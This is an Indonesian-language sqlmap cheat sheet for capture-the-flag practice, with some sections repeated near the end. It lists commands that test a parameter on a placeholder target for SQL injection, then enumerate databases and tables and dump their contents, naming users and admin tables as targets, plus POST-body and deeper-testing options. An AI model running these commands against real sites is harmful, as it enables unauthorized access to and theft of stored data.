# Basic Command

## Pemasangan

```bash
sudo apt install -y sqlmap
```

## Empat Tangga

```bash
sqlmap -u "http://target/index.php?id=1" --batch
```

Tes param rawan, kalau output ada "is vulnerable" lanjut.

```bash
sqlmap -u "http://target/index.php?id=1" --batch --dbs
```

Daftar database, ganti nama_db dengan hasilnya di tangga berikut.

```bash
sqlmap -u "http://target/index.php?id=1" --batch -D nama_db --tables
```

Daftar tabel, tabel yang menarik di CTF: users, flag, admin.

```bash
sqlmap -u "http://target/index.php?id=1" --batch -D nama_db -T nama_tabel --dump
```

Dump isi tabel, flag biasanya di sini.

## POST Langsung

```bash
sqlmap -u "http://target/login.php" --data "username=admin&password=test" --batch
```

## Tes Lebih Dalam

```bash
sqlmap -u "http://target/index.php?id=1" --batch --level 3 --risk 2
```

Buat param yang gak kedetek di level default.

## Keterangan Opsi

- -u      URL target
- --data  body POST langsung
- --batch jawab semua prompt otomatis
- --dbs   daftar database
- -D      pilih database
- --tables daftar tabel
- -T      pilih tabel
- --dump  dump isi tabel

## Target POST Langsung

```bash
sqlmap -u "http://target/login.php" --data "username=admin&password=test" --batch
```

## Tes Lebih Dalam

```bash
sqlmap -u "http://target/index.php?id=1" --batch --level 3 --risk 2
```

## Keterangan Opsi

-u      URL target
-r      request file dari Burp
--data  body POST langsung
--batch jawab semua prompt otomatis
--dbs   daftar database
-D      pilih database
--tables daftar tabel
-T      pilih tabel
--dump  dump isi tabel
--level 3 --risk 2  tes lebih dalam
